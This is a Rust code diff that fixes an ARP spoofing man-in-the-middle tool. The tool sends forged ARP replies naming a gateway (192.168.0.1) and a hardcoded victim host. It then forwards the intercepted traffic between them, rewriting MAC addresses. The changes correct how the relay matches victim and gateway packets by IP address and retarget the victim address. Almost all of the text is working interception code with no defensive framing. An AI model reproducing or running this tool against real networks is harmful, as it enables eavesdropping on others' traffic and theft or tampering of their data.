@@ -84,7 +84,7 @@ fn send_arp_spoof_packets(network_interface: &NetworkInterface, gateway_ip_addr:
     let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
     tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
-    let process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
+    let mut process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
         let ethernet_packet = rx.next().ok().and_then(|incoming_packet| {
             packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
         });
@@ -110,14 +110,14 @@ fn send_arp_spoof_packets(network_interface: &NetworkInterface, gateway_ip_addr:
                 },
                 packet if packet.get_ethertype() == EtherTypes::Ipv4 => {
                     packet::ipv4::Ipv4Packet::owned(packet.payload().to_owned()).and_then::<packet::ipv4::Ipv4Packet,_>(|ipv4_packet| {
-                        if packet.get_source() == victim_mac_addr && packet.get_destination() == network_interface.mac.unwrap() {
+                        if ipv4_packet.get_source() == victim_ip_addr && packet.get_destination() == network_interface.mac.unwrap() {
                             if let Some(mut new_packet) = packet::ethernet::MutableEthernetPacket::owned(packet.packet().to_vec()) {
                                 new_packet.set_source(network_interface.mac.unwrap());
                                 new_packet.set_destination(gateway_mac_addr);
                                 tx.send_to(new_packet.packet(), None);
                             }
                         }
-                        else if packet.get_source() == gateway_mac_addr && packet.get_destination() == network_interface.mac.unwrap() {
+                        else if packet.get_source() == gateway_mac_addr && ipv4_packet.get_destination() == victim_ip_addr {
                             if let Some(mut new_packet) = packet::ethernet::MutableEthernetPacket::owned(packet.packet().to_vec()) {
                                 new_packet.set_source(network_interface.mac.unwrap());
                                 new_packet.set_destination(victim_mac_addr);
@@ -147,6 +147,6 @@ fn main() {
     let (mut tx, mut rx) = create_channels(&interface);
 
     loop {
-        send_arp_spoof_packets(&interface, Ipv4Addr::new(192,168,0,1), Ipv4Addr::new(192,168,0,76), tx.as_mut(), rx.as_mut(), std::time::Duration::from_secs(10));
+        send_arp_spoof_packets(&interface, Ipv4Addr::new(192,168,0,1), Ipv4Addr::new(192,168,0,77), tx.as_mut(), rx.as_mut(), std::time::Duration::from_secs(10));
     }
 }
